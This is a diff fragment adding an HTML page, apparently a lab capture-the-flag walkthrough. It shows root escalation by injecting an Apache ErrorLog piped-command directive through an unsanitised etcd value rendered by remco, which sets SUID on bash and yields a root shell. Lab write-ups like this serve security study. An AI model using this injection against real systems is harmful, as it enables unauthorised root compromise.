+    <span style="color:#e06c75;">nodes</span>     = [<span style="color:#98c379;">"http://127.0.0.1:2379"</span>]
+    <span style="color:#e06c75;">keys</span>      = [<span style="color:#98c379;">"/customers"</span>]
+    <span style="color:#e06c75;">watch</span>     = <span style="color:#d19a66;">true</span>
+    <span style="color:#e06c75;">interval</span>  = <span style="color:#d19a66;">5</span></code></pre>
+
+                <p>And the template it uses:</p>
+
+                <pre><code class="language-bash">cat /etc/remco/templates/010-customers.conf.tmpl</code></pre>
+
+                <pre><code class="language-django"><span style="color:#c678dd;">{% for</span> customer <span style="color:#c678dd;">in</span> <span style="color:#61afef;">lsdir</span>(<span style="color:#98c379;">"/customers"</span>) <span style="color:#c678dd;">%}</span>
+<span style="color:#c678dd;">{% if</span> <span style="color:#61afef;">exists</span>(<span style="color:#61afef;">printf</span>(<span style="color:#98c379;">"/customers/%s/url"</span>, customer)) <span style="color:#c678dd;">%}</span>
+&lt;VirtualHost *:80&gt;
+    ServerName <span style="color:#c678dd;">{{</span> <span style="color:#61afef;">getv</span>(<span style="color:#61afef;">printf</span>(<span style="color:#98c379;">"/customers/%s/url"</span>,customer)) <span style="color:#c678dd;">}}</span>.ten.vl
+    DocumentRoot /srv/<span style="color:#c678dd;">{{</span> customer <span style="color:#c678dd;">}}</span>/
+&lt;/VirtualHost&gt;
+<span style="color:#c678dd;">{% endif %}</span>
+<span style="color:#c678dd;">{% endfor %}</span></code></pre>
+
+                <p>The flow: remco watches the <code>/customers</code> prefix in etcd. On every change, it renders the template to generate an Apache virtual hosts file at <code>/etc/apache2/sites-enabled/010-customers.conf</code> and runs <code>systemctl restart apache2.service</code> as <code>root</code>. This is effectively a privileged cyclic process — similar to a cron job.</p>
+
+                <p>I verify I can both read and write to etcd:</p>
+
+                <pre><code class="language-bash">ETCDCTL_API=3 etcdctl --endpoints=http://127.0.0.1:2379 get / --prefix</code></pre>
+
+                <pre><code class="language-plaintext">/customers/ten-3e21f664/url
+asd</code></pre>
+
+                <h2>Privilege Escalation — Apache ErrorLog Directive Injection</h2>
+                <p>The key insight is that the customer URL value is inserted directly into the template with no sanitization whatsoever. This lets us break out of the <code>&lt;VirtualHost&gt;</code> block and inject arbitrary Apache directives.</p>
+
+                <p>I first try <code>CustomLog</code> with Apache's <a href="https://httpd.apache.org/docs/2.4/logs.html#piped">piped logging syntax</a>, but it breaks the virtual host config and the command never executes. Switching to <code>ErrorLog</code>, which also supports piped logging per the <a href="https://httpd.apache.org/docs/2.4/mod/core.html#errorlog">official documentation</a>, works perfectly.</p>
+
+                <p>I inject an <code>ErrorLog</code> directive that calls <code>chmod</code> to set the SUID bit on <code>/bin/bash</code>:</p>
+
+                <pre><code class="language-bash">ETCDCTL_API=3 etcdctl --endpoints=http://127.0.0.1:2379 put /customers/ten-erwerw/url 'xdd.ten.vl
+ErrorLog "|/usr/bin/chmod u+s /usr/bin/bash"
+#'</code></pre>
+
+                <p>After the next remco watch cycle (up to 5 seconds), the generated configuration file looks like:</p>
+
+                <pre><code class="language-apacheconf"><span style="color:#e06c75;">&lt;VirtualHost</span> <span style="color:#d19a66;">*:80</span><span style="color:#e06c75;">&gt;</span>
+    <span style="color:#61afef;">ServerName</span> xdd.ten.vl
+    <span style="color:#61afef;">ErrorLog</span> <span style="color:#98c379;">"|/usr/bin/chmod u+s /usr/bin/bash"</span>
+    <span style="color:#e5c07b;">#</span>.ten.vl
+    <span style="color:#61afef;">DocumentRoot</span> /srv/ten-erwerw/
+<span style="color:#e06c75;">&lt;/VirtualHost&gt;</span></code></pre>
+
+                <p>Apache restarts with this configuration, causing it to execute the <code>ErrorLog</code> piped command as <code>root</code>. Checking the result:</p>
+
+                <pre><code class="language-bash">ls -lah /bin/bash</code></pre>
+
+                <pre><code class="language-plaintext">-rwsr-xr-x 1 root root 1.4M Mar 14 2024 /bin/bash</code></pre>
+
+                <p>The SUID bit is set. Running <code>bash</code> with the <code>-p</code> flag to preserve the effective UID gives us a root shell:</p>
+
+                <pre><code class="language-bash">bash -p</code></pre>
+
+                <pre><code class="language-plaintext">bash-5.1# whoami
+root</code></pre>
+
+                <p>Root access achieved. We can now retrieve the root flag and complete the machine.</p>
+            </div>
+
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
